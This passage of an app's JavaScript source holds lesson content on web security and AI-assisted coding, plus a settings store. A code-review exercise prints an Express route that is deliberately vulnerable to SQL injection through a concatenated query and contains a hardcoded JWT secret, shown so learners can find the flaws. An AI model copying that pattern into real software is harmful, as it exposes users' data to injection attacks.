        body: 'When you send data over HTTP, data is sent as plain text. Anyone intercepting your network packets (like someone on the same public Wi-Fi network) can read your login passwords or credit card numbers in clear text. HTTPS (Hypertext Transfer Protocol Secure) encrypts all data in transit using SSL/TLS protocols. Deployed sites must use HTTPS to ensure user data cannot be read or modified by interceptors.',
        code: '// HTTP (Insecure): Request data travels as "username=ada&password=123"\n// HTTPS (Secure): Request data travels encrypted as "01a8f90bc74e2d5c8b..."',
      },
      {
        heading: 'CSRF: Cross-Site Request Forgery',
        body: 'Cross-Site Request Forgery (CSRF) is an exploit where a malicious website tricks a user\'s browser into sending an authorized request to your server. If a user is logged into bank.com, and visits evilsite.com, the browser automatically attaches cookies (including session cookies) when loading resources. evilsite.com could include an invisible form submitting to bank.com/transfer. We protect against this using the SameSite=Strict or SameSite=Lax cookie attribute, or utilizing CSRF tokens.',
        code: '// Protecting session cookies against CSRF in Express:\nres.cookie("sessionId", id, {\n  httpOnly: true, // Prevents Javascript from reading cookie (XSS protection)\n  secure: true,   // Sends cookie only over HTTPS\n  sameSite: "strict" // Prevents browser from sending cookie on cross-site requests (CSRF protection)\n});',
      },
      {
        heading: 'Interactive Code Review: spot-the-vulnerability',
        body: 'Reviewing code critically to detect security issues is a vital skill. Let\'s practice. Look at the code block below. It has three major security flaws: a database query vulnerable to SQL Injection, a hardcoded security secret, and no input size checks. Read the code and identify the flaws.',
        code: 'import express from "express";\nimport pg from "pg";\nconst app = express();\napp.use(express.json());\n\nconst pool = new pg.Pool({ connectionString: "postgres://localhost/db" });\n\n// Hardcoded Secret:\nconst JWT_SECRET = "super-secret-key-12345";\n\napp.post("/api/users/find", async (req, res) => {\n  const email = req.body.email;\n  \n  // SQL Injection Vulnerability (String Concatenation):\n  const query = `SELECT * FROM users WHERE email = \'${email}\'`;\n  const result = await pool.query(query);\n  res.json(result.rows);\n});',
        callout: 'Analyzing code defensively is part of the code review process. Always run static code analysis tools (linters) or security scanners in your production pipelines to catch these issues automatically.',
      },
    ],
    aiPrompt: 'Review the vulnerable code provided in the lesson. Generate a fully secure version of the server file, replacing string concatenation with parameterized queries, loading the JWT secret key from environment variables, and adding express-rate-limit protection.',
    terminalMission: 'Write a security audit report on the vulnerable server code. List the 3 security vulnerabilities found, explain how an attacker could exploit them, and write the corrected code block.',
  },

  'm7-ai-tools': {
    pathId: 'full-stack-web',
    title: 'How AI coding tools work — autocomplete to agents',
    duration: '9 min',
    mekLabel: 'enough to understand how language models generate code and manage workspace context',
    sections: [
      {
        heading: 'Large Language Models (LLMs) for code generation',
        body: 'Large Language Models (LLMs) are trained on billions of lines of public source code from platforms like GitHub. By analyzing patterns, they learn to predict the most likely next characters or words in a sequence. When you prompt an AI, it is not "thinking" or "knowing" like a human programmer; it is matching patterns from the highest-quality coding practices in its dataset to generate matching structures.',
        code: '// Input prompt: "const sum = (a, b) =>"\n// AI predicts next characters based on patterns: " a + b;"',
      },
      {
        heading: 'Autocomplete vs Chat vs Agentic Assistants',
        body: 'AI coding tools fall into three main categories: 1. Autocomplete (e.g. Copilot) suggests inline code completions as you type. 2. Chat Assistants (e.g. ChatGPT, Claude) let you ask questions and generate code blocks in a side panel. 3. Agentic Assistants (e.g. Cursor, Gemini Antigravity) are advanced programs that can read your workspace files, run terminal commands, and edit multiple files to resolve complex instructions.',
        code: '// Autocomplete: Suggests single lines.\n// Chat: Generates isolated code blocks.\n// Agentic: "Run tests, read the file error, edit store.js line 45, compile again."',
      },
      {
        heading: 'Context Windows: managing the AI\'s memory',
        body: 'AI tools have a Context Window — a limit on how much text they can process in a single chat turn. The AI cannot read your entire codebase unless you explicitly share files or let the tool index your workspace. Managing what files you feed the AI is a crucial skill: sharing too little context leads to generic code, while sharing too much clutters the memory and can make the AI lose focus.',
        code: '// Ineffective Context: "Fix the error in my database connection." (No file shared)\n// Effective Context: Sharing your pool configuration file and the exact terminal error message.',
        callout: 'AI models do not execute code in their "heads" — they guess structures. That is why verifying and testing every snippet they write is a critical part of the developer workflow.',
      },
    ],
    aiPrompt: 'Explain how code autocomplete engines process file context (open tabs, cursor position, import trees) to suggest relevant code. List three best practices for keeping files tidy to help autocomplete engines.',
    terminalMission: 'Write a comparative review of autocomplete, chat, and agentic workflows. Discuss the strengths and weaknesses of each for a beginner learning to code.',
  },

  'm7-prompting': {
    pathId: 'full-stack-web',
    title: 'Prompting for code — stack, constraints, style',
    duration: '11 min',
    mekLabel: 'enough to write structured prompts defining roles, tech stacks, and constraints',
    sections: [
      {
        heading: 'Role Setting: giving the AI a persona',
        body: 'To get high-quality code, start your prompt by assigning a specific role or persona to the AI (e.g., "You are a senior Node.js security engineer"). This instructs the LLM to search its dataset for professional, defensive, and optimized programming patterns, avoiding beginner mistakes.',
        code: '// Generic Persona: "Write a login script."\n// Professional Persona: "You are a senior Express security developer. Write a secure login endpoint using bcrypt and express-rate-limit."',
      },
      {
        heading: 'Defining the Technology Stack explicitly',
        body: 'AI models can easily mix technologies or use outdated methods. Always explicitly list the technologies, libraries, and versions in your prompt. This prevents the AI from suggesting libraries you haven\'t installed (e.g. writing MongoDB syntax when you are using PostgreSQL).',
        code: '// Prompt tech stack specification:\n// - Frontend: React 18, Tailwind CSS, Vite\n// - State: Zustand\n// - Backend: Node 20, Express, pg (PostgreSQL driver)\n// Do not use any libraries outside this list.',
      },
      {
        heading: 'Setting constraints and formatting style',
        body: 'Always tell the AI what NOT to do. Setting constraints forces the AI to output exactly the style you need. For example, you can tell it: "Do not install new packages", "Always use arrow functions", or "Never write inline CSS". This keeps your codebase uniform.',
        code: '// Constraints:\n// - Use parameterized queries for all DB actions.\n// - Do not write comments inside code blocks.\n// - Keep functions under 20 lines of code.',
      },
      {
        heading: 'Providing database schemas and context templates',
        body: 'If you want the AI to write database routes, copy and paste your database schema (CREATE TABLE statements) directly into the chat. If you want it to write a React component, share matching components so it can copy your styling tokens and import patterns.',
        code: '// Schema Context provided in prompt:\n// CREATE TABLE posts (id SERIAL PRIMARY KEY, title TEXT, content TEXT);\n// Prompt: "Write a route to insert a post."',
        callout: 'A good prompt structure follows: Role -> Goal -> Technology Stack -> Constraints -> Context. Using this format ensures predictable, high-quality code outputs.',
      },
    ],
    aiPrompt: 'Write a detailed prompt to generate a React checkout component. Specify the role, technology stack (React, Tailwind, Zustand), style constraints (no external CSS, keep functions modular), and context (a mock cart array).',
    terminalMission: 'Create a reusable text template file named devRules.txt listing your project technology stack, folder structure rules, naming conventions, and security constraints to attach to future AI chats.',
  },

  'm7-reading-output': {
    pathId: 'full-stack-web',
    title: 'Reading AI output critically — spotting bugs & lies',
    duration: '11 min',
    mekLabel: 'enough to audit AI-generated code for security flaws, hallucinations, and logic bugs',
    sections: [
      {
        heading: 'The Auditing Mindset: treat AI as a junior assistant',
        body: 'Never copy and paste AI-generated code blindly. Treat the AI as an eager, junior developer who writes code quickly but makes frequent mistakes. Read every line of the generated code. Ask yourself: "Does this function actually do what I asked? Are there syntax errors? What happens if an API call fails?"',
        code: '// Copy-paste trap: accepting code immediately.\n// Auditing process: reading each line, tracking variables, and identifying edge cases.',
      },
      {
        heading: 'Spotting Hallucinations: imaginary packages and functions',
        body: 'AI models can "hallucinate" — they might invent functions or npm libraries that do not exist because the words sound plausible in sequence. For example, it might tell you to install an imaginary package like express-secure-auth-helper or use a non-existent method. Always cross-reference unfamiliar APIs with official documentation.',
        code: '// Hallucinated library call:\n// import helper from "express-magical-validator"; // ⚠️ Does not exist!\n\n// Correct approach: check NPM registry or use standard validators.',
      },
      {
        heading: 'Locating hidden security gaps',
        body: 'AI is designed to write functional code, not necessarily secure code. It will frequently output scripts containing security holes: hardcoding passwords, using string concatenation for SQL statements, or leaving routes unprotected. Scan the code specifically for security vulnerabilities before integrating it.',
        code: '// Vulnerable AI output:\n// pool.query(`SELECT * FROM items WHERE name = \'${name}\'`);\n\n// Audited secure correction:\n// pool.query("SELECT * FROM items WHERE name = $1", [name]);',
      },
      {
        heading: 'Checking for edge cases and error handlers',
        body: 'AI often writes the "happy path" — code that works when inputs are perfect. But real apps face errors: databases go offline, users type empty fields, network requests time out. Audit the generated code to ensure it wraps operations in try/catch blocks and handles loading and error states.',
        code: '// AI happy path code:\n// const data = await fetch(url).then(res => res.json());\n\n// Audited robust code:\n// Wrap in try/catch and check if response.ok is true.',
        callout: 'Writing code is easy; reading and maintaining code is hard. Using AI tools makes you a code reviewer. Improving your reading skills is now more important than memorizing syntax.',
      },
    ],
    aiPrompt: 'Provide an example of an AI-generated Javascript function containing a subtle bug (like an off-by-one index loop) or library hallucination. Explain how to identify the bug and rewrite it correctly.',
    terminalMission: 'Review a provided AI-generated checkout controller. Identify any security holes, syntax errors, and missing edge cases. Write a code review report listing your findings.',
  },

  'm7-iterative': {
    pathId: 'full-stack-web',
    title: 'Iterative workflow — small asks, test each step',
    duration: '9 min',
    mekLabel: 'enough to break down complex features into incremental tasks and verify each step',
    sections: [
      {
        heading: 'Incremental Development: building brick by brick',
        body: 'A major mistake is asking AI to build a massive feature all at once (e.g. "Build a full-stack social media app"). The AI will write half-finished files, lose track of variables, and create a buggy mess. The secret to vibecoding is incremental development: breaking a feature down into a list of small, logical steps and implementing them one by one.',
        code: '// Giant Request (Bad): "Build a shopping cart page with database integration."\n// Incremental Step 1: "Create the database table schema."\n// Incremental Step 2: "Write the Express GET route to fetch cart items."',
      },
      {
        heading: 'The "One Thing at a Time" prompting rule',
        body: 'Keep your prompts single-focused. Ask the AI to write one route, one function, or one component style at a time. Once the AI completes that step, review it, test it, and only then proceed to the next prompt. This keeps the AI\'s context window focused and results in much higher code quality.',
        code: '// Focused prompt:\n// "Write an Express POST route `/api/todos` that inserts a task. Do not add styling or UI components yet."',
      },
      {
        heading: 'The Verify-Immediately Loop',
        body: 'Run your compiler, build command, or tests immediately after the AI writes a chunk of code. Do not let the AI write multiple files before verifying the project compiles. If you wait, identifying which file caused a syntax or import error becomes extremely difficult. Compile early, test often.',
        code: '// 1. AI writes code -> 2. Run compiler (npm run dev) -> 3. Test route -> 4. Commit -> 5. Next step.',
      },
      {
        heading: 'Correcting AI drift',
        body: 'As you chat, the AI might begin importing unnecessary packages, refactoring unrelated files, or changing variable names. Pay close attention. If the AI starts to drift, immediately correct it: "Do not refactor that function, only edit store.js to add the new action."',
        code: '// Redirection prompt: "You modified app.css, but I only asked you to edit Header.jsx. Discard the app.css edits and only output the Header code."',
        callout: 'Working iteratively feels slower at first, but it saves hours of debugging time. It prevents the code from becoming a tangled knot that neither you nor the AI can resolve.',
      },
    ],
    aiPrompt: 'Describe how to break down the implementation of a "Full Stack E-commerce Cart Page with Checkout" into 5 distinct, sequential, and bite-sized prompts to feed to an AI assistant.',
    terminalMission: 'Write a step-by-step implementation log showing how you would build a blog system incrementally. Outline what you would build, test, and commit at each step.',
  },

  'm7-ai-debug-git': {
    pathId: 'full-stack-web',
    title: 'Debugging AI code & version control discipline',
    duration: '10 min',
    mekLabel: 'enough to systematically debug compiler errors and use Git checkpoints',
    sections: [
      {
        heading: 'Systematic debugging: feeding logs, not summaries',
        body: 'When your code crashes, do not prompt the AI with vague statements like "It is broken" or "It did not work." Instead, practice systematic debugging. Copy the exact terminal error traceback, compile failure message, or browser console stack trace, and paste it directly to the AI along with the relevant code file.',
        code: '// Vague prompt (Inffective): "My server is crashing when I run it."\n// Systematic prompt (Effective): "My Express server crashes on npm run dev. Here is the terminal stack trace: [Paste stack trace] and my database config file: [Paste file]"',
      },
      {
        heading: 'Git as a safety net: commit before asking',
        body: 'Before you ask an AI to refactor code or implement a new feature, make sure your working tree is clean. Commit your working files to Git. This creates a secure checkpoint. If the AI writes buggy code that breaks your project, you don\'t have to undo it line-by-line; you can simply run git restore or git checkout to reset to your clean commit and start fresh.',
        code: '// Checkpoint command:\n// $ git add .\n// $ git commit -m "feat: user dashboard functional (pre-AI styling)"\n// If AI breaks code: $ git restore .',
      },
      {
        heading: 'Auditing changes via git diff',
        body: 'When an AI tool (especially an agentic assistant) modifies files on your computer, always run git diff to audit exactly what was changed before staging or committing the files. Check that the AI did not delete important comments, modify unrelated configurations, or leave broken boilerplate code in place.',
        code: '// Review changes line-by-line:\n// $ git diff\n// + Added secure parameterized placeholders\n// - Removed hardcoded admin credentials',
      },
    ],
    aiPrompt: 'Write a prompt instructing an AI assistant to fix a "Cannot read properties of undefined (reading \'map\')" React console error. Include the component code and the console log details in the prompt.',
    terminalMission: 'Initialize a local git repository. Make a commit. Simulate an AI making modifications that break the project. Use git diff to identify the changes and git commands to discard them.',
  },

  'm7-ethics-limits': {
    pathId: 'full-stack-web',
    title: 'Ethics — don\'t ship code you don\'t understand',
    duration: '8 min',
    mekLabel: 'enough to take full ownership of your codebase and explain every line of code',
    sections: [
      {
        heading: 'Copilot vs Autopilot: you are the pilot in command',
        body: 'AI is your copilot — a powerful assistant that helps you write code, explain concepts, and debug errors. But you are the pilot in command. You are responsible for navigating the flight and landing safely. You must make the final decisions and understand why the application is structured the way it is.',
        code: '// Copilot model: AI suggests route options -> you verify and commit.\n// Autopilot model (Insecure): letting AI write and ship code directly without review.',
      },
      {
        heading: 'Code Ownership: you cannot blame the AI',
        body: 'Once you accept AI-generated code into your repository, it is no longer the AI\'s code — it is YOUR code. If the application contains a security hole that exposes user data, a bug that corrupts a database, or a performance leak that crashes the server, you cannot blame the AI. You are responsible for every line of code you ship.',
        code: '// Professional code standard: "I wrote/approved this codebase. I can explain why every table, route, and state variable is configured this way."',
      },
      {
        heading: 'Understanding Liability in software engineering',
        body: 'In professional software development, shipping code you do not understand is high-risk. It can lead to data leaks, system downtime, and loss of user trust. Taking the time to read documentation, write tests, and verify operations is what separates a professional engineer from someone who copy-pastes code templates.',
        code: '// Risky engineering: shipping code immediately without knowing how the third-party API parses values.\n// Professional engineering: reading the API docs, testing with edge cases, and writing defensive error handlers.',
      },
      {
        heading: 'The Ultimate Vibecoding Rule',
        body: 'The golden rule of vibecoding is simple: never ship a line of code to production unless you can explain exactly what it does, why it is there, and how it handles errors. AI enables you to build incredibly fast, but your intelligence and critical judgment are what make the application safe, secure, and robust.',
        code: '// Golden Rule: before hitting commit, look at the changes and explain them out loud to yourself (or use Rubber Duck debugging). If you can\'t explain it, don\'t commit it.',
        callout: 'Vibecoding is not coding less; it is coding at a higher level of abstraction. You focus on architecture, logic, security, and design, while letting the AI handle syntax and boilerplate.',
      },
    ],
    aiPrompt: 'Review the ethical implications of using generative AI for software development. Draft a developer code of conduct focusing on: security auditing, licensing, and code understanding.',
    terminalMission: 'Take a complex utility function written by an AI (such as a recursive JSON parser). Write a detailed code report explaining how every single line of that function operates.',
  },

  'm8-planning': {
    pathId: 'full-stack-web',
    title: 'Planning your capstone — spec, data model, routes',
    duration: '10 min',
    mekLabel: 'enough to convert an idea into user stories, database schemas, and REST endpoints',
    sections: [
      {
        heading: 'Project Scope: writing user stories and specifications',
        body: 'Before writing any code or prompting an AI assistant, you must plan your application. Designing without a map leads to disorganized databases, bloated code, and incomplete features. We start by defining the Project Scope using User Stories. A user story describes a feature from the user\'s perspective: "As a [type of user], I want to [do something] so that [some benefit]." This keeps your project scope focused on what actually matters.',
        code: '// User Story examples:\n// - "As a student, I want to save a lesson to my bookmarks so that I can study it later."\n// - "As an admin, I want to delete flag comments to keep the chat clean."',
      },
      {
        heading: 'Designing the Database Schema (Data Model)',
        body: 'Your data model is the foundation of your entire application. You need to map out your PostgreSQL tables, column names, data types, and constraints (like NOT NULL or UNIQUE), and define how tables relate to each other (using Primary Keys and Foreign Keys). Doing this step on paper or a text editor saves hours of database refactoring later.',
        code: '-- Database schema plan (Relational structure):\nCREATE TABLE users (\n  id SERIAL PRIMARY KEY,\n  username VARCHAR(50) UNIQUE NOT NULL\n);\n\nCREATE TABLE bookmarks (\n  id SERIAL PRIMARY KEY,\n  user_id INT REFERENCES users(id) ON DELETE CASCADE,\n  lesson_id VARCHAR(50) NOT NULL\n);',
      },
      {
        heading: 'Mapping out the REST API endpoints',
        body: 'With your database plan ready, define the REST endpoints your Express server will expose. List the HTTP method (GET, POST, PUT, DELETE), the URL path, the expected request body structure, and the returned JSON format. This API specification serves as a contract between your frontend React code and your backend Express server.',
        code: '// API route specification schema:\n// POST /api/bookmarks\n//   - Request Body: { "userId": 1, "lessonId": "m8-planning" }\n//   - Response JSON: { "id": 12, "saved": true }\n//   - Status Code: 201 Created',
        callout: 'Keep your Capstone Project scope small for the first version (known as a Minimum Viable Product, or MVP). Focus on building 2-3 core user stories exceptionally well rather than 10 half-functional features.',
      },
    ],
    aiPrompt: 'I want to build a Capstone project: a "Recipies and Meal Planner App". Generate a complete planning document containing: 3 user stories, a PostgreSQL relational schema (users, recipes, meal_plans), and a table of REST API endpoints needed for these features.',
    terminalMission: 'Create a planning file named myCapstonePlan.md. Document your project idea, write 3 clear user stories, outline your relational tables database schema, and write a table of REST API endpoints.',
  },

  'm8-building': {
    pathId: 'full-stack-web',
    title: 'Building with AI — manual parts, security audit',
    duration: '14 min',
    mekLabel: 'enough to bootstrap files with AI, pair incrementally, and perform manual security audits',
    sections: [
      {
        heading: 'Bootstrapping: setting up your environment',
        body: 'To start building, create a clean workspace. Initialize Git, create your folders (separate directories for frontend and backend), set up your package.json dependencies, and configure environment variables. You can ask an AI assistant to write your initial file setups (like database configuration and Express entry point boilerplates) to save time.',
        code: '// Typical startup structure:\n// $ mkdir capstone && cd capstone\n// $ git init\n// $ npm init -y\n// $ npm install express pg cors dotenv\n// Create your database client setup file.',
      },
      {
        heading: 'The Human-AI Pairing Loop: building features',
        body: 'Follow the iterative workflow learned in Module 7: implement one user story at a time. Ask the AI to write a specific route or database query. Audit the output immediately. Run the compiler or check logs to verify the code works. Commit the change using Git before moving to the next feature. Never let the AI generate hundreds of lines of code without running verification checks.',
        code: '// Step 1: Prompt AI for Bookmarks database table migration.\n// Step 2: Verify migration, run queries in DB console.\n// Step 3: Commit migration file.\n// Step 4: Prompt AI for Express POST route.\n// Step 5: Verify POST route via Postman/fetch.',
      },
      {
        heading: 'Performing a manual security audit',
        body: 'Before launching, perform a manual security review of your codebase. Security is your responsibility, not the AI\'s. Use this audit checklist: 1. Are all database queries parameterized (no string concatenation)? 2. Are passwords hashed using bcrypt before saving? 3. Are API secret keys loaded from process.env (not hardcoded)? 4. Are sensitive routes protected by checking JWT headers? 5. Is there a rate limiter on registration and login endpoints?',
        code: '// Audit Check: check all instances of "pool.query"\n// ⚠️ Vulnerable: pool.query(`SELECT * FROM posts WHERE id = ${id}`);\n// Safe: pool.query("SELECT * FROM posts WHERE id = $1", [id]);',
        callout: 'If your security audit fails one check, do not ignore it. A single SQL Injection hole or hardcoded key exposes your entire user database to hackers.',
      },
    ],
    aiPrompt: 'Review the backend API code you generated for my recipes app. Help me conduct a security audit. Check specifically for: SQL Injection vulnerability, rate-limiting missing, unsafe raw query parameters, and generate the secure patched version.',
    terminalMission: 'Perform a manual security audit of your own capstone codebase. Scan all source code files specifically for hardcoded keys, raw string SQL, and missing error handler blocks. Write an audit report.',
  },

  'm8-deploy-present': {
    pathId: 'full-stack-web',
    title: 'Deploy, README & presenting what AI got right/wrong',
    duration: '10 min',
    mekLabel: 'enough to deploy a full-stack project, write a professional README, and present human-AI insights',
    sections: [
      {
        heading: 'Production Deployment: going live in the cloud',
        body: 'Your capstone project is complete, secure, and tested. Now, deploy it. Run npm run build on your React frontend and deploy it to a static host (Vercel/Netlify). Deploy your Express API server to Render or Railway. Set up a live cloud PostgreSQL database on Neon or Supabase. Configure your production environment variables on the dashboards, aligning your API URLs and Database connection URLs.',
        code: '// Production variables checklist:\n// - Render server: DATABASE_URL pointing to Neon cloud DB\n// - Vercel frontend: VITE_API_URL pointing to Render server URL\n// - CORS config: Allowed origin set to Vercel page URL',
      },
      {
        heading: 'The art of the README: writing professional docs',
        body: 'A project without documentation is a project that doesn\'t exist. Your GitHub README.md is the first page developers and employers see. A professional README should contain: 1. Project Title and descriptive summary. 2. List of Technologies used. 3. Relational database schema description. 4. Step-by-step local installation instructions. 5. Clear documentation of key REST API endpoints.',
        code: '# Foodify — Meal Planner App\nFoodify is a full-stack web application designed to help users plan meals...\n\n## Tech Stack\n- Frontend: React, Tailwind CSS\n- Backend: Express, Node.js, PostgreSQL\n...',
      },
      {
        heading: 'Presenting human-AI collaborative development',
        body: 'When presenting your Capstone to potential employers or peers, highlight the human-AI development process. Discuss: what boilerplate did the AI generate quickly? What complex logic or bugs did the AI introduce (e.g. infinite re-renders or database crashes)? How did you identify, audit, and refactor the code? Demonstrating that you are the director who reviews and corrects AI code is highly valued in the modern industry.',
        code: '// Collaboration highlight:\n// "The AI assistant generated the initial JWT login boilerplate, but it omitted token expiration and password rate limits. I audited the security gaps, added express-rate-limit, and shortened the JWT lifespan to 15 minutes."',
        callout: 'Your README is your portfolio showcase. A neat, detailed markdown file showing screenshots, API routes, and a clear explanation of how you directed the AI makes your application stand out.',
      },
    ],
    aiPrompt: 'Generate a professional GitHub README template for my recipes planner capstone. Include sections for features list, tech stack, PostgreSQL schema documentation, installation guide, and a "Human-AI Collaboration Summary" detailing my code auditing process.',
    terminalMission: 'Deploy your capstone project. Write a README.md file matching all professional sections, and add a detailed section explaining what bugs or security gaps the AI assistant introduced and how you resolved them.',
  },
}

// ─── Store ─────────────────────────────────────────────────────────────────────

const getSavedSettings = () => {
  try {
    const saved = localStorage.getItem('vibeskool_settings')
    return saved ? JSON.parse(saved) : {}
  } catch (e) {
    return {}
  }
}

export const useStore = create((set) => ({
  // User
  user: {
    name: 'Shedrach',
    avatar: 'S',
    mekScore: 68,
    lessonsCompleted: 12,
    buildsUnlocked: 4,
  },

  // Progress per path (id → number of completed lessons)
  progress: {
    'full-stack-web': 0,
    'mobile-app':     0,
    'blockchain-web3': 0,
    'game-dev':       0,
    'os-low-level':   0,
    'ai-ml':          0,
  },

  // Settings
  settings: {
    fontSize:       'md',
    terminalSound:  false,
    showMekBar:     true,
    compactSidebar: false,
    anthropicKey:   '',       // Anthropic API key
    dailyGoal:      2,        // daily lesson goal target
    ...getSavedSettings()
  },

  // Active lesson
  activeLesson: null,
  setActiveLesson: (id) => set({ activeLesson: id }),

  // Sidebar
  sidebarOpen: true,
  toggleSidebar: () => set((s) => ({ sidebarOpen: !s.sidebarOpen })),

  // Update settings
  updateSettings: (patch) => set((s) => {
    const nextSettings = { ...s.settings, ...patch }
    try {
      localStorage.setItem('vibeskool_settings', JSON.stringify(nextSettings))
    } catch (e) {}
    return { settings: nextSettings }
  }),

  // Complete a lesson
  completeLesson: (pathId) => set((s) => ({
    progress: {
      ...s.progress,
      [pathId]: Math.min(
        (s.progress[pathId] || 0) + 1,
        PATHS.find((p) => p.id === pathId)?.lessons_data.length || 99
      ),
    },
    user: {
      ...s.user,
      lessonsCompleted: s.user.lessonsCompleted + 1,
      mekScore: Math.min(100, s.user.mekScore + 3),
    },
  })),

  passedModules: [],
  passModule: (moduleId) => set((s) => {
    const passedModules = s.passedModules.includes(moduleId)
      ? s.passedModules
      : [...s.passedModules, moduleId]
    return {
      passedModules,
      user: {
        ...s.user,
        mekScore: Math.min(100, s.user.mekScore + 10),
      }
    }
  }),
}))
